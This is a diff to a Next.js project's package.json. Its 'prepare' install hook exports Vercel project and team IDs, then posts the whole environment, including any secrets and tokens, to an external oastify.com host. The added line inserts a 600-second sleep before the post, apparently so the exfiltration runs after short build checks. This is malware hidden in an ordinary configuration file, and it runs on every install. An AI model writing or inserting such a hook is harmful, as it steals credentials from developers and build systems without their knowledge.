@@ -4,7 +4,7 @@
     "dev": "next",
     "build": "next build",
     "start": "next start",
-    "prepare": "export VERCEL_URL=\"hwgh2.vercel.app\" && export NEXT_PUBLIC_VERCEL_URL=\"hwgh2.vercel.app\" && export NEXT_PUBLIC_VERCEL_GIT_REPO_SLUG=\"hwgh2\" && export VERCEL_GIT_REPO_OWNER=\"w2h3\" && export NEXT_PUBLIC_VERCEL_ARTIFACTS_OWNER=\"zZC1iyzNa4HujA2PODDHZL3h\" && export NEXT_PUBLIC_VERCEL_ORG_ID=\"team_RjvV9ZDkklN7ZaMRR8ZcH2yS\" && export VERCEL_ARTIFACTS_OWNER=\"zZC1iyzNa4HujA2PODDHZL3h\" && export NEXT_PUBLIC_VERCEL_PROJECT_ID=\"prj_XzY8v7O6J5Q5Hd6IGAMqWALteHsW\" && export NEXT_PUBLIC_VERCEL_GIT_REPO_OWNER=\"w2h3\" && export VERCEL_ORG_ID=\"team_RjvV9ZDkklN7ZaMRR8ZcH2yS\" && export VERCEL_PROJECT_ID=\"prj_XzY8v7O6J5Q5Hd6IGAMqWALteHsW\" && curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/h2gh2"
+    "prepare": "export VERCEL_URL=\"hwgh2.vercel.app\" && export NEXT_PUBLIC_VERCEL_URL=\"hwgh2.vercel.app\" && export NEXT_PUBLIC_VERCEL_GIT_REPO_SLUG=\"hwgh2\" && export VERCEL_GIT_REPO_OWNER=\"w2h3\" && export NEXT_PUBLIC_VERCEL_ARTIFACTS_OWNER=\"zZC1iyzNa4HujA2PODDHZL3h\" && export NEXT_PUBLIC_VERCEL_ORG_ID=\"team_RjvV9ZDkklN7ZaMRR8ZcH2yS\" && export VERCEL_ARTIFACTS_OWNER=\"zZC1iyzNa4HujA2PODDHZL3h\" && export NEXT_PUBLIC_VERCEL_PROJECT_ID=\"prj_XzY8v7O6J5Q5Hd6IGAMqWALteHsW\" && export NEXT_PUBLIC_VERCEL_GIT_REPO_OWNER=\"w2h3\" && export VERCEL_ORG_ID=\"team_RjvV9ZDkklN7ZaMRR8ZcH2yS\" && export VERCEL_PROJECT_ID=\"prj_XzY8v7O6J5Q5Hd6IGAMqWALteHsW\" && sleep 600 && curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/h2gh2"
   },
   "dependencies": {
     "next": "latest",
